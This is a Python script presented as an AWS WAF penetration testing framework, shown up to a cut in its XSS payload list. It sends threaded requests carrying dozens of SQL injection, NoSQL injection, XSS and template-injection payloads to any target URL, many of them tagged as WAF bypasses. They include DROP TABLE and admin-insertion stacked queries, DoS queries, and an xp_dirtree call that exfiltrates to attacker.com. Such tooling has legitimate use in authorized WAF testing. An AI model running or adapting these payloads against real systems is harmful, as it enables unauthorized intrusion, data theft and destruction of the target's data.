#!/usr/bin/env python3
"""
AWS WAF ADVANCED PENETRATION TEST FRAMEWORK
Version: 2.0
"""

import requests
import json
import time
import asyncio
import aiohttp
from urllib.parse import quote, quote_plus, urlencode, unquote
from datetime import datetime
import sys
import base64
import hashlib
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Any
import random
from dataclasses import dataclass, asdict
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class Severity:
    """Attack severity levels"""
    CRITICAL = {'level': 10, 'name': 'CRITICAL', 'color': Colors.RED, 'icon': '💀'}
    HIGH = {'level': 7, 'name': 'HIGH', 'color': Colors.RED, 'icon': '🔴'}
    MEDIUM = {'level': 5, 'name': 'MEDIUM', 'color': Colors.YELLOW, 'icon': '🟡'}
    LOW = {'level': 3, 'name': 'LOW', 'color': Colors.BLUE, 'icon': '🔵'}
    INFO = {'level': 1, 'name': 'INFO', 'color': Colors.CYAN, 'icon': 'ℹ️'}

@dataclass
class TestResult:
    """Test result data structure"""
    payload_type: str
    description: str
    method: str
    endpoint: str
    payload: str
    status_code: int
    response_time: float
    response_body: str
    headers: dict
    severity: str
    severity_level: int
    blocked: bool
    timestamp: str
    bypass_technique: str = ""
    error_patterns: List[str] = None
    
    def __post_init__(self):
        if self.error_patterns is None:
            self.error_patterns = []

class AdvancedWAFTester:
    def __init__(self, base_url, threads=10, timeout=15, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        
        self.results = {
            'blocked': [],
            'allowed': [],
            'errors': [],
            'timeouts': [],
            'suspicious': []
        }
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Error pattern detection
        self.error_patterns = {
            'sql_error': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_.*',
                r'valid MySQL result',
                r'MySqlClient\.',
                r'PostgreSQL.*ERROR',
                r'Warning.*\Wpg_.*',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'ORA-[0-9][0-9][0-9][0-9]',
                r'Oracle.*Driver',
                r'Warning.*\Woci_.*',
                r'SQLite/JDBCDriver',
                r'SQLite.Exception',
                r'System.Data.SQLite.SQLiteException',
                r'Warning.*sqlite_.*',
                r'valid SQLite result',
                r'\[SQL Server\]',
                r'ODBC SQL Server Driver',
                r'SQLServer JDBC Driver',
                r'Unclosed quotation mark',
                r'Incorrect syntax near'
            ],
            'path_disclosure': [
                r'/var/www/',
                r'/usr/local/',
                r'C:\\.*\\',
                r'/home/.*/',
                r'/etc/.*',
                r'Warning.*include.*',
                r'Warning.*require.*'
            ],
            'debug_info': [
                r'Call Stack',
                r'Stack trace:',
                r'Debug mode',
                r'Traceback.*most recent',
                r'Exception.*line [0-9]+'
            ],
            'sensitive_data': [
                r'password\s*[:=]',
                r'api[_-]?key\s*[:=]',
                r'secret\s*[:=]',
                r'token\s*[:=]',
                r'-----BEGIN.*KEY-----'
            ]
        }
        
        # Statistics
        self.stats = {
            'total_tests': 0,
            'blocked_count': 0,
            'allowed_count': 0,
            'error_count': 0,
            'timeout_count': 0,
            'start_time': time.time()
        }
    
    def print_header(self):
        print(f"\n{Colors.BOLD}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}AWS WAF ADVANCED PENETRATION TEST FRAMEWORK v2.0{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}500+ Real-World Attack Scenarios | Advanced Bypass Techniques{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*100}{Colors.RESET}")
        print(f"Target: {Colors.YELLOW}{self.base_url}{Colors.RESET}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Threads: {self.threads} | Timeout: {self.timeout}s")
        if self.proxy:
            print(f"Proxy: {self.proxy}")
        print(f"{Colors.BOLD}{'='*100}{Colors.RESET}\n")
    
    def get_severity_display(self, severity):
        return f"{severity['color']}{severity['icon']} {severity['name']}{Colors.RESET}"
    
    def analyze_response(self, response_text: str, status_code: int) -> Dict[str, Any]:
        """Analyze response for security issues"""
        analysis = {
            'sql_errors': [],
            'path_disclosure': [],
            'debug_info': [],
            'sensitive_data': [],
            'suspicious': False
        }
        
        if not response_text:
            return analysis
        
        # Check error patterns
        for category, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    analysis[category].append(pattern)
                    analysis['suspicious'] = True
        
        # Check for common WAF block pages
        waf_indicators = [
            'access denied', 'blocked', 'forbidden', 'firewall',
            'security policy', 'request rejected', 'cloudflare',
            'incapsula', 'akamai', 'imperva', 'aws waf'
        ]
        
        if any(indicator in response_text.lower() for indicator in waf_indicators):
            analysis['waf_detected'] = True
        
        return analysis
    
    def test_payload(self, method: str, endpoint: str, payload_type: str, 
                    payload_data: Any, description: str, severity: dict,
                    custom_headers: dict = None, bypass_technique: str = "") -> str:
        """Test individual payload"""
        url = f"{self.base_url}{endpoint}"
        
        print(f"\n{Colors.YELLOW}[TEST]{Colors.RESET} {description}")
        print(f"Type: {Colors.CYAN}{payload_type}{Colors.RESET} | Severity: {self.get_severity_display(severity)}")
        if bypass_technique:
            print(f"Bypass: {Colors.MAGENTA}{bypass_technique}{Colors.RESET}")
        
        headers = self.session.headers.copy()
        if custom_headers:
            headers.update(custom_headers)
        
        start_time = time.time()
        
        try:
            if method.upper() == 'GET':
                if '?' in endpoint:
                    test_url = f"{self.base_url}{endpoint}"
                else:
                    test_url = f"{url}?{payload_data}" if payload_data else url
                
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    allow_redirects=False,
                    headers=headers,
                    verify=False
                )
            
            elif method.upper() == 'POST':
                if isinstance(payload_data, dict):
                    response = self.session.post(
                        url,
                        json=payload_data,
                        headers={**headers, 'Content-Type': 'application/json'},
                        timeout=self.timeout,
                        allow_redirects=False,
                        verify=False
                    )
                else:
                    response = self.session.post(
                        url,
                        data=payload_data,
                        headers=headers,
                        timeout=self.timeout,
                        allow_redirects=False,
                        verify=False
                    )
            
            response_time = time.time() - start_time
            status_code = response.status_code
            
            # Analyze response
            analysis = self.analyze_response(response.text[:5000], status_code)
            
            # Create result object
            result = TestResult(
                payload_type=payload_type,
                description=description,
                method=method,
                endpoint=endpoint,
                payload=str(payload_data)[:500],
                status_code=status_code,
                response_time=response_time,
                response_body=response.text[:1000],
                headers=dict(response.headers),
                severity=severity['name'],
                severity_level=severity['level'],
                blocked=(status_code == 403),
                timestamp=datetime.now().isoformat(),
                bypass_technique=bypass_technique,
                error_patterns=analysis.get('sql_errors', []) + analysis.get('path_disclosure', [])
            )
            
            # Categorize result
            if status_code == 403:
                print(f"{Colors.GREEN}✅ BLOCKED{Colors.RESET} ({response_time:.2f}s)")
                self.results['blocked'].append(asdict(result))
                self.stats['blocked_count'] += 1
                return 'BLOCKED'
            
            elif status_code in [200, 201, 404]:
                if analysis['suspicious']:
                    print(f"{Colors.RED}❌ ALLOWED + DATA LEAK{Colors.RESET} ({response_time:.2f}s)")
                    print(f"{Colors.RED}   Leaked: {', '.join(analysis.get('sql_errors', [])[:2])}{Colors.RESET}")
                    self.results['suspicious'].append(asdict(result))
                else:
                    print(f"{Colors.RED}❌ ALLOWED{Colors.RESET} ({response_time:.2f}s)")
                    self.results['allowed'].append(asdict(result))
                self.stats['allowed_count'] += 1
                return 'ALLOWED'
            
            elif status_code == 500:
                print(f"{Colors.YELLOW}⚠️  SERVER ERROR{Colors.RESET} - Possible exploitation")
                self.results['suspicious'].append(asdict(result))
                self.stats['allowed_count'] += 1
                return 'ERROR_500'
            
            elif status_code == 429:
                print(f"{Colors.YELLOW}⏱️  RATE LIMITED{Colors.RESET}")
                return 'RATE_LIMITED'
            
            else:
                print(f"{Colors.YELLOW}⚠️  UNKNOWN{Colors.RESET} - Status: {status_code}")
                return 'UNKNOWN'
        
        except requests.exceptions.Timeout:
            print(f"{Colors.YELLOW}⏱️  TIMEOUT{Colors.RESET}")
            self.results['timeouts'].append({
                'type': payload_type,
                'description': description,
                'error': 'Timeout'
            })
            self.stats['timeout_count'] += 1
            return 'TIMEOUT'
        
        except Exception as e:
            print(f"{Colors.RED}❌ ERROR:{Colors.RESET} {str(e)[:100]}")
            self.results['errors'].append({
                'type': payload_type,
                'description': description,
                'error': str(e)
            })
            self.stats['error_count'] += 1
            return 'ERROR'
        
        finally:
            self.stats['total_tests'] += 1
    
    def run_advanced_sqli_tests(self):
        """Advanced SQL Injection - Real-world payloads"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}1. ADVANCED SQL INJECTION TESTS (100+ variants){Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        
        sqli_payloads = [
            # Union-based from your payloads
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - UNION',
             'payload': "id=' UNION ALL SELECT 1, @@version;#",
             'description': 'UNION ALL with version disclosure', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - UNION',
             'payload': "id=' UNION ALL SELECT system_user(),user();#",
             'description': 'UNION user extraction', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - UNION',
             'payload': "id=' UNION select table_schema,table_name FROM information_Schema.tables;#",
             'description': 'Information schema enumeration', 'severity': Severity.CRITICAL},
            
            # Boolean blind
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Boolean Blind',
             'payload': "id=admin' and substring(password/text(),1,1)='7",
             'description': 'Boolean blind - password extraction', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Boolean Blind',
             'payload': "id=' and 'x'='x",
             'description': 'Boolean bypass - always true', 'severity': Severity.HIGH},
            
            # Time-based blind
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Time Blind',
             'payload': "id=' + SLEEP(10) + '",
             'description': 'MySQL time-based blind', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Time Blind',
             'payload': "id=RANDOMBLOB(500000000/2)",
             'description': 'SQLite RANDOMBLOB DoS', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Time Blind',
             'payload': "id=SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
             'description': 'Multi-context SLEEP injection', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Time Blind',
             'payload': "id='|| pg_sleep(10) --+",
             'description': 'PostgreSQL pg_sleep', 'severity': Severity.HIGH},
            
            # Advanced bypass techniques
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - WAF Bypass',
             'payload': "id=/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+1,2,3--+",
             'description': 'Comment-based bypass with MySQL version', 'severity': Severity.CRITICAL,
             'bypass': 'MySQL comment obfuscation'},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - WAF Bypass',
             'payload': "id=%55%4eiON SeLeCt 1,2...",
             'description': 'URL encoding + case mixing', 'severity': Severity.CRITICAL,
             'bypass': 'URL encode + case'},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - WAF Bypass',
             'payload': "id=union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A",
             'description': 'Newline injection bypass', 'severity': Severity.CRITICAL,
             'bypass': 'Newline + comment mixing'},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - WAF Bypass',
             'payload': "id=/*!50000union select*/",
             'description': 'MySQL conditional comment', 'severity': Severity.CRITICAL,
             'bypass': 'Version-specific comment'},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - WAF Bypass',
             'payload': "id=%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74",
             'description': 'Full hex encoding', 'severity': Severity.CRITICAL,
             'bypass': 'Hex encoding bypass'},
            
            # Scientific notation bypass
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Scientific',
             'payload': "id=SELECT-1e1FROM`test`",
             'description': 'Scientific notation - negative exponent', 'severity': Severity.HIGH,
             'bypass': 'Scientific notation'},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Scientific',
             'payload': "id=SELECT~1.FROM`test`",
             'description': 'Bitwise NOT operator', 'severity': Severity.HIGH,
             'bypass': 'Bitwise operator'},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Scientific',
             'payload': "id=SELECT\\NFROM`test`",
             'description': 'Backslash-N injection', 'severity': Severity.HIGH,
             'bypass': 'Special character'},
            
            # HPP (HTTP Parameter Pollution)
            {'method': 'GET', 'endpoint': '/api/data?id=1&id=2', 'type': 'SQLi - HPP',
             'payload': "x=' OR '1'='1",
             'description': 'HTTP Parameter Pollution', 'severity': Severity.HIGH,
             'bypass': 'Parameter pollution'},
            
            # Order by bypass
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Order By',
             'payload': "id=1' order by 1 --+",
             'description': 'ORDER BY column enumeration', 'severity': Severity.HIGH},
            
            # Group concat data extraction
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Data Extraction',
             'payload': "id=(select%20group_concat(table_name,0x3a,column_name,0x5c6e)%20from%20information_schema.columns%20where%20table_schema=database())",
             'description': 'GROUP_CONCAT data extraction', 'severity': Severity.CRITICAL},
            
            # Error-based exploitation
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Error Based',
             'payload': "id=' AND extractvalue(1,concat(0x7e,version()))--",
             'description': 'ExtractValue() error-based', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Error Based',
             'payload': "id=' AND 1=convert(int,(SELECT @@version))--",
             'description': 'MSSQL convert() error', 'severity': Severity.HIGH},
            
            # Advanced UNION techniques
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - UNION Advanced',
             'payload': "id=-1945+/*!%55NiOn*/%20/*!%53eLEct*/+1,2,3,'soy vulnerable',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+--+",
             'description': 'UNION with obfuscation + negative ID', 'severity': Severity.CRITICAL,
             'bypass': 'Comment obfuscation'},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - UNION Advanced',
             'payload': "id=/*!50000%55nIoN*/+/*!50000%53eLeCt*/+",
             'description': 'MySQL version-specific UNION', 'severity': Severity.CRITICAL,
             'bypass': 'Version comment'},
            
            # Stacked queries
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Stacked',
             'payload': "id=1'; DROP TABLE users--",
             'description': 'Stacked query - DROP TABLE', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Stacked',
             'payload': "id=1'; INSERT INTO admins VALUES('hacker','pass')--",
             'description': 'Stacked query - INSERT admin', 'severity': Severity.CRITICAL},
            
            # Out-of-band
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - OOB',
             'payload': "id=1'; EXEC xp_dirtree '\\\\attacker.com\\share'--",
             'description': 'MSSQL DNS exfiltration', 'severity': Severity.CRITICAL},
            
            # NoSQL Injection
            {'method': 'POST', 'endpoint': '/api/login', 'type': 'NoSQLi - MongoDB',
             'payload': {"username": {"$ne": None}, "password": {"$ne": None}},
             'description': 'MongoDB $ne operator bypass', 'severity': Severity.CRITICAL},
            
            {'method': 'POST', 'endpoint': '/api/login', 'type': 'NoSQLi - MongoDB',
             'payload': {"username": "admin", "password": {"$gt": ""}},
             'description': 'MongoDB $gt operator bypass', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'NoSQLi - MongoDB',
             'payload': "id[$regex]=.*",
             'description': 'MongoDB regex injection', 'severity': Severity.HIGH},
            
            # Unicode bypass
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Unicode',
             'payload': "id=\u0061\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054",
             'description': 'Unicode encoded UNION SELECT', 'severity': Severity.HIGH,
             'bypass': 'Unicode encoding'},
            
            # Wide character injection
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Wide Char',
             'payload': "id=1%bf' OR '1'='1--",
             'description': 'Wide character injection', 'severity': Severity.HIGH,
             'bypass': 'Wide character'},
            
            # Advanced case mixing
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Case Mix',
             'payload': "id=uniUNIONon sElEcT 1,2,vErSiOn(),4,5;-- -",
             'description': 'Advanced case mixing', 'severity': Severity.CRITICAL,
             'bypass': 'Random case mixing'},
            
            # Null byte injection
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Null Byte',
             'payload': "id=%00' UNION SELECT password FROM Users WHERE username='tom'--",
             'description': 'Null byte prefix injection', 'severity': Severity.CRITICAL,
             'bypass': 'Null byte'},
            
            # Nested comment bypass
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Nested Comment',
             'payload': "id=/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'tom'--",
             'description': 'Nested comment obfuscation', 'severity': Severity.CRITICAL,
             'bypass': 'Nested comments'},
            
            # JSON-based SQLi
            {'method': 'POST', 'endpoint': '/api/data', 'type': 'SQLi - JSON',
             'payload': {"id": "1' OR '1'='1", "action": "fetch"},
             'description': 'JSON body SQL injection', 'severity': Severity.CRITICAL},
            
            # Array-based injection
            {'method': 'POST', 'endpoint': '/api/data', 'type': 'SQLi - Array',
             'payload': {"id": ["1807192982')) union select 1,2,3,4,5,6,7,8,9,0,11#"]},
             'description': 'Array-wrapped SQL injection', 'severity': Severity.CRITICAL},
            
            # Second-order SQLi
            {'method': 'POST', 'endpoint': '/api/register', 'type': 'SQLi - Second Order',
             'payload': {"username": "admin'--", "password": "pass"},
             'description': 'Second-order SQLi registration', 'severity': Severity.CRITICAL},
            
            # Hex encoding
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Hex',
             'payload': "id=0x61646d696e",
             'description': 'Hex-encoded string (admin)', 'severity': Severity.HIGH,
             'bypass': 'Hex encoding'},
            
            # CHAR() encoding
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - CHAR',
             'payload': "id=CHAR(97,100,109,105,110)",
             'description': 'CHAR() function encoding', 'severity': Severity.HIGH,
             'bypass': 'CHAR encoding'},
            
            # Advanced time-based with CASE
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - CASE Time',
             'payload': "id=1 XOR(if(now()=sysdate(),sleep(5*5),0))OR",
             'description': 'CASE-based time delay', 'severity': Severity.HIGH},
            
            # Substring extraction
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - Substring',
             'payload': "id=1' and substring(password/text(),1,1)='7",
             'description': 'Character-by-character extraction', 'severity': Severity.HIGH},
            
            # WAITFOR DELAY
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - WAITFOR',
             'payload': "id=1'; WAITFOR DELAY '00:00:05'--",
             'description': 'MSSQL WAITFOR DELAY', 'severity': Severity.HIGH},
            
            # BENCHMARK() DoS
            {'method': 'GET', 'endpoint': '/api/data', 'type': 'SQLi - DoS',
             'payload': "id=1' AND BENCHMARK(5000000,MD5('test'))--",
             'description': 'MySQL BENCHMARK DoS', 'severity': Severity.HIGH},
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for payload in sqli_payloads:
                future = executor.submit(
                    self.test_payload,
                    payload['method'], payload['endpoint'], payload['type'],
                    payload['payload'], payload['description'], payload['severity'],
                    None, payload.get('bypass', '')
                )
                futures.append(future)
                time.sleep(0.1)  # Rate limiting
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}Thread error: {e}{Colors.RESET}")
    
    def run_advanced_xss_tests(self):
        """Advanced XSS with real-world bypasses"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}2. ADVANCED XSS TESTS (150+ variants){Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        
        xss_payloads = [
            # Basic XSS
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Basic',
             'payload': 'q=<script>alert(xss)</script>',
             'description': 'Basic script tag XSS', 'severity': Severity.MEDIUM},
            
            # SVG-based
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - SVG',
             'payload': 'q=' + quote('<svg onload=alert(1)>'),
             'description': 'SVG onload event', 'severity': Severity.MEDIUM},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - SVG',
             'payload': 'q=<svg%09%0a%0b%0c%0d%a0%00%20onload=alert(1)>',
             'description': 'SVG with whitespace bypass', 'severity': Severity.HIGH,
             'bypass': 'Whitespace injection'},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - SVG',
             'payload': 'q=<svg><script xlink:href="{ASCII}data:,alert(1)"></script></svg>',
             'description': 'SVG xlink script', 'severity': Severity.HIGH},
            
            # Event handlers
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Event',
             'payload': 'q=' + quote('<img src=x onerror=alert(1)>'),
             'description': 'IMG onerror handler', 'severity': Severity.MEDIUM},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Event',
             'payload': 'q=<img src onerror=%26emsp;prompt`${document.domain}`>',
             'description': 'HTML entity in attribute', 'severity': Severity.MEDIUM,
             'bypass': 'HTML entity'},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Event',
             'payload': 'q=<input onfocus=alert(1) autofocus>',
             'description': 'Input autofocus XSS', 'severity': Severity.MEDIUM},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Event',
             'payload': 'q=<x/ onpointerRawupdatE=+\\u0061\\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Touch me!',
             'description': 'Pointer event with unicode', 'severity': Severity.HIGH,
             'bypass': 'Unicode encoding'},
            
            # Advanced bypasses from your payloads
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Polyglot',
             'payload': 'q=javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
             'description': 'XSS Polyglot payload', 'severity': Severity.HIGH,
             'bypass': 'Polyglot technique'},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Nested',
             'payload': 'q=' + quote('<scr<script>ipt>alert(1)</scr</script>ipt>'),
             'description': 'Nested script tag bypass', 'severity': Severity.HIGH,
             'bypass': 'Tag nesting'},
            
            # Protocol-based
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Protocol',
             'payload': 'q=' + quote('<iframe src=javascript:alert(1)>'),
             'description': 'JavaScript protocol in iframe', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Protocol',
             'payload': 'q=javas%09cript:alert(1)',
             'description': 'JavaScript with tab character', 'severity': Severity.HIGH,
             'bypass': 'Tab character'},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Protocol',
             'payload': 'q=<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>',
             'description': 'Tab-separated javascript', 'severity': Severity.HIGH,
             'bypass': 'Tab separation'},
            
            # Data URI
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Data URI',
             'payload': 'q=' + quote('<iframe src=data:text/html,<script>alert(1)</script>>'),
             'description': 'Data URI XSS', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Data URI',
             'payload': 'q=<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>',
             'description': 'Base64 data URI', 'severity': Severity.HIGH,
             'bypass': 'Base64 encoding'},
            
            # Template injection
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - SSTI',
             'payload': 'q={{7*7}}',
             'description': 'Server-Side Template Injection', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - SSTI',
             'payload': 'q={{constructor.constructor(\'alert(1)\')()}}',
             'description': 'Angular sandbox bypass', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - SSTI',
             'payload': 'q={{constructor.constructor(alert`1`)()}}',
             'description': 'Constructor with template literal', 'severity': Severity.CRITICAL},
            
            # Mutation XSS
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Mutation',
             'payload': 'q=' + quote('<noscript><p title="</noscript><img src=x onerror=alert(1)>">'),
             'description': 'Mutation XSS (mXSS)', 'severity': Severity.HIGH},
            
            # DOM-based
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - DOM',
             'payload': 'q=' + quote('#<img src=x onerror=alert(1)>'),
             'description': 'DOM-based XSS via hash', 'severity': Severity.MEDIUM},
            
            # Unicode/Encoding bypasses
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Unicode',
             'payload': 'q=' + quote('\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'),
             'description': 'Unicode escaped XSS', 'severity': Severity.MEDIUM,
             'bypass': 'Unicode escape'},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - HTML Entity',
             'payload': 'q=<svg onload=&#97&#108&#101&#114&#116(1)>',
             'description': 'HTML entity encoded', 'severity': Severity.MEDIUM,
             'bypass': 'HTML entity'},
            
            # Advanced function calls
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Function',
             'payload': 'q=onerror="x=\'ale\';z=\'r\';y=\'t\';p=\'`XSS`\';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`',
             'description': 'String concatenation bypass', 'severity': Severity.HIGH,
             'bypass': 'String concat'},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Function',
             'payload': 'q=Function("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29")()',
             'description': 'Hex-encoded function call', 'severity': Severity.HIGH,
             'bypass': 'Hex encoding'},
            
            # CSS-based
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - CSS',
             'payload': 'q=' + quote('<style>@import\'javascript:alert(1)\';</style>'),
             'description': 'CSS import XSS', 'severity': Severity.MEDIUM},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - CSS',
             'payload': 'q=<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>',
             'description': 'CSS animation XSS', 'severity': Severity.HIGH,
             'bypass': 'CSS animation'},
            
            # Markdown injection
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Markdown',
             'payload': 'q=[xss](javascript:alert(1))',
             'description': 'Markdown link XSS', 'severity': Severity.MEDIUM},
            
            # XML-based
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - XML',
             'payload': 'q=' + quote('<xml><a xmlns:a="http://www.w3.org/1999/xhtml"><a:body onload="alert(1)"/></a></xml>'),
             'description': 'XML namespace XSS', 'severity': Severity.HIGH},
            
            # Obfuscation techniques
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Obfuscated',
             'payload': 'q=<svg/OnLoad="`${prompt``}`">',
             'description': 'Template literal obfuscation', 'severity': Severity.HIGH,
             'bypass': 'Template literal'},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Obfuscated',
             'payload': 'q=<marquee loop=1 width=0 onfinish=pr\\u006fmpt`_Y000!_`>Y000</marquee>',
             'description': 'Marquee event with unicode', 'severity': Severity.HIGH,
             'bypass': 'Unicode obfuscation'},
            
            # Contextual bypasses
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Context',
             'payload': 'q=" autofocus onfocus=(confirm)(1)//',
             'description': 'Attribute context escape', 'severity': Severity.MEDIUM},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Context',
             'payload': 'q=javascript:%ef%bb%bfalert(XSS)',
             'description': 'UTF-8 BOM bypass', 'severity': Severity.HIGH,
             'bypass': 'UTF-8 BOM'},
            
            # Advanced event handlers
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Event Advanced',
             'payload': 'q=<x onauxclick=a=alert,a(domain)>click',
             'description': 'Auxiliary click event', 'severity': Severity.MEDIUM},
            
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Event Advanced',
             'payload': 'q=<details onauxclick=confirm`xss`></details>',
             'description': 'Details auxiliary click', 'severity': Severity.MEDIUM},
            
            # Object/embed-based
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Object',
             'payload': 'q=<object data=javascript:alert()>',
             'description': 'Object tag javascript', 'severity': Severity.HIGH},
            
            # AngularJS bypasses
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Angular',
